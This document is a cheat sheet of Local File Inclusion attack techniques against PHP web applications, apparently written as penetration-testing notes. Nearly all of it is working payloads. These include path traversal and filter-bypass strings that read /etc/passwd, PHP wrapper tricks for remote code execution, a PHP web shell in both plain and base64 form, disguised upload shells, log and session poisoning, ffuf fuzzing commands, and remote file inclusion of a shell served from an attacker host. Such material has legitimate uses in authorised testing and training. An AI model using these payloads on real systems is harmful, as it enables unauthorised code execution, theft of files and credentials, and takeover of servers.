# LFI Commands Cheat Sheet

## Basic LFI Testing
```
# Linux common files
/etc/passwd
/etc/hosts
/etc/hostname

# Windows common files
C:\Windows\boot.ini
C:\Windows\System32\drivers\etc\hosts
```

## Path Traversal
```
# Basic traversal
../../../../etc/passwd

# Non-recursive filter bypass
....//....//....//etc/passwd
..././..././..././etc/passwd
```

## URL Encoding Bypass
```
# Encode ../ as %2e%2e%2f
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## PHP Filters
```
# Base64 encode source code
php://filter/read=convert.base64-encode/resource=config

# Decode base64 output
echo 'base64string' | base64 -d
```

## PHP Wrappers for RCE
```
# Data wrapper (requires allow_url_include=On)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id

# Base64 encode web shell
echo '<?php system($_GET["cmd"]); ?>' | base64

# Input wrapper
curl -X POST --data '<?php system($_GET["cmd"]); ?>' "http://target/index.php?language=php://input&cmd=id"

# Expect wrapper (if enabled)
expect://id
```

## File Upload Techniques
```
# Create malicious image
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# Create zip with PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

# Access zip wrapper
zip://shell.jpg#shell.php

# Create phar file
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

## Log Poisoning
```
# Poison User-Agent
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target/

# Common log locations
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/apache2/error.log
```

## Session Poisoning
```
# Session file location
/var/lib/php/sessions/sess_[PHPSESSID]

# Poison session via parameter
http://target/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

## Fuzzing Commands
```
# Fuzz for parameters
ffuf -w wordlist.txt:FUZZ -u 'http://target/index.php?FUZZ=value' -fs [size]

# Fuzz for LFI payloads
ffuf -w LFI-wordlist.txt:FUZZ -u 'http://target/index.php?param=FUZZ' -fs [size]

# Fuzz for webroot
ffuf -w webroot-wordlist.txt:FUZZ -u 'http://target/index.php?param=../../../../FUZZ/index.php' -fs [size]
```

## Configuration Files to Check
```
# PHP configuration
/etc/php/7.4/apache2/php.ini

# Check for allow_url_include
echo 'base64string' | base64 -d | grep allow_url_include

# Apache configuration
/etc/apache2/apache2.conf
/etc/apache2/envvars

# Check for expect module
echo 'base64string' | base64 -d | grep expect
```

## Remote File Inclusion
```
# Host malicious script
python3 -m http.server 80

# Include remote file
http://target/index.php?param=http://attacker-ip/shell.php&cmd=id

# FTP hosting
python -m pyftpdlib -p 21
```

## String Generation for Path Truncation
```
# Generate long string (obsolete technique)
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
